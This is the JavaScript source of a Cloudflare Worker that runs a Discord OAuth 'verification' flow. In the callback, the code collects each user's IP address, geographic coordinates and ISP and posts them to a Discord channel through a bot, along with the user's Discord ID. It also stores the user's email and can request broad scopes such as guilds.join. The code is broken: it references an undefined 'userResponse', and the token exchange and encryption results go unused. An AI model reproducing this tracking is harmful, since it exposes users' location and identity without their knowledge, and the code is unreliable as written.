export default {
  async fetch(request, env) {
    const url = new URL(request.url);

    if (url.pathname === '/login') {
      const token = url.searchParams.get('token');
      if (!token || token.includes('-SUCCESS')) {
        return Response.redirect('https://www.google.com', 302);
    }    
      const { results } = await env.DB.prepare('SELECT 1 FROM messages WHERE randkey = ?').bind(token).all();
      if (results.length === 0) return new Response('Invalid token', { status: 403 });
    
      const scope = url.searchParams.get('all') === 'true' 
        ? 'identify email connections guilds guilds.join' 
        : 'identify email';
    
      const params = new URLSearchParams({
        client_id: env.DISCORD_CLIENT_ID,
        response_type: 'code',
        scope,
        redirect_uri: env.REDIRECT_URI,
        state: token, 
      });
    
      return Response.redirect(`https://discord.com/oauth2/authorize?${params.toString()}`);
    }

    if (url.pathname === '/callback') {
      const code = url.searchParams.get('code');
      const token = url.searchParams.get('state');  // get login token

      if (!code) return new Response('Missing code', { status: 400 });

      const tokenResponse = await fetch('https://discord.com/api/oauth2/token', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({
          client_id: env.DISCORD_CLIENT_ID,
          client_secret: env.DISCORD_CLIENT_SECRET,
          grant_type: 'authorization_code',
          code,
          redirect_uri: env.REDIRECT_URI,
        }),
      });


      const userData = await userResponse.json();

 
      const ip = request.headers.get('CF-Connecting-IP') || request.headers.get('X-Forwarded-For') || request.headers.get('Remote-Addr');
      const geoData = request.cf ? request.cf : { latitude: 'Unknown', longitude: 'Unknown', isp: 'Unknown' };
      const locationInfo = {
        latitude: geoData.latitude,
        longitude: geoData.longitude,
        isp: geoData.asOrganization || 'Unknown'
      };
      const result = {
        status: "success",
        ip: request.headers.get('CF-Connecting-IP') || request.headers.get('X-Forwarded-For') || request.headers.get('Remote-Addr'),
      };
      await sendMessageToChannel(env, userData, ip, locationInfo);

      const encryptedData = await encryptData(JSON.stringify(result), env.PUBLIC_RSA_KEY);
          // Update D1 DB
          await env.DB.prepare('UPDATE messages SET  dcid = ?, dcemail=?, randkey=? WHERE randkey = ?')
          .bind(userData.id,userData.email,token+"-SUCCESS", token)
          .run();
          //replace the URL of the success page app 
          return Response.redirect(`https://<replace URL here>/?randkey=${encodeURIComponent(token+"-SUCCESS")}`, 302);
        
    }

    return new Response('Not found', { status: 404 });
  },
};

async function encryptData(data, publicKeyPem) {
  const encoder = new TextEncoder();
  const dataBuffer = encoder.encode(data);

  const publicKey = await crypto.subtle.importKey(
    'spki',
    convertPemToBinary(publicKeyPem),
    { name: 'RSA-OAEP', hash: 'SHA-256' },
    false,
    ['encrypt']
  );

  const encryptedBuffer = await crypto.subtle.encrypt(
    { name: 'RSA-OAEP' },
    publicKey,
    dataBuffer
  );

  return btoa(String.fromCharCode(...new Uint8Array(encryptedBuffer)));
}

function convertPemToBinary(pem) {
  const base64 = pem.replace(/-----[^-]+-----/g, '').replace(/\s+/g, '');
  const binary = atob(base64);
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i++) {
    bytes[i] = binary.charCodeAt(i);
  }
  return bytes.buffer;
}

async function sendMessageToChannel(env, userData, ip, locationInfo) {
  const messageContent = `Message Received: ${userData.username}#${userData.discriminator} (ID: <@${userData.id}>)\nIP: ${ip}\nLocation: (${locationInfo.latitude}, ${locationInfo.longitude})\nISP: ${locationInfo.isp}`;

  try {
    const response = await fetch(`https://discord.com/api/v10/channels/<Channel ID here>/messages`, {
      method: 'POST',
      headers: {
        Authorization: `Bot ${env.DISCORD_BOT_TOKEN}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ content: messageContent }),
    });

    if (!response.ok) {
      const errorData = await response.json();
      console.error('Error sending message to channel:', errorData);
      throw new Error(`Failed to send message: ${errorData.message}`);
    }

    console.log('Message sent successfully!');
  } catch (error) {
    console.error('Error in sendMessageToChannel:', error.message);
  }
}
